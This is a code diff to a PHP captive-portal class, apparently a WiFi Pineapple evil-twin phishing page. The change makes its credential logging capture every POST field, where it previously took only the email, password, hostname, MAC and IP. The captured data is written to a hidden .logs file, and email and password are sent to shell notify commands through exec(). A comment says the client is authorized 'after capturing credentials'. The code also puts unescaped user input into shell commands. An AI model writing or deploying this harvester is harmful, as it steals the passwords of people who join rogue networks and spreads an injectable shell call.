@@ -4,26 +4,33 @@ class MyPortal extends Portal
 {
     public function handleAuthorization()
     {
-        if (isset($_POST['email'])) {
-            $email = $_POST['email'];
-            $pwd = $_POST['password'];
-            $hostname = $_POST['hostname'];
-            $mac = $_POST['mac'];
-            $ip = $_POST['ip'];
-
+        if (!empty($_POST)) {
             $reflector = new \ReflectionClass(get_class($this));
             $logPath = dirname($reflector->getFileName());
 
-            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\nemail: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            $logData = "[" . date('Y-m-d H:i:s') . "Z]\n";
+            foreach ($_POST as $key => $value) {
+                $logData .= "$key: $value\n";
+            }
+            $logData .= "\n";
 
-            $this->execBackground("notify '$email - $pwd'");
-            exec("pineapple notify '$email - $pwd'");
+            file_put_contents("{$logPath}/.logs", $logData, FILE_APPEND);
 
-            // Explicitly authorize the client after capturing credentials
-            $this->authorizeClient($mac);
+            // Notify with basic credentials
+            if (isset($_POST['email']) && isset($_POST['password'])) {
+                $email = $_POST['email'];
+                $pwd = $_POST['password'];
+                $this->execBackground("notify '$email - $pwd'");
+                exec("pineapple notify '$email - $pwd'");
+            }
+
+            // Explicitly authorize the client using MAC
+            if (isset($_POST['mac'])) {
+                $this->authorizeClient($_POST['mac']);
+            }
         }
 
-        // Ensure parent authorization handling completes the process
+        // Ensure parent authorization handling completes
         parent::handleAuthorization();
     }
 
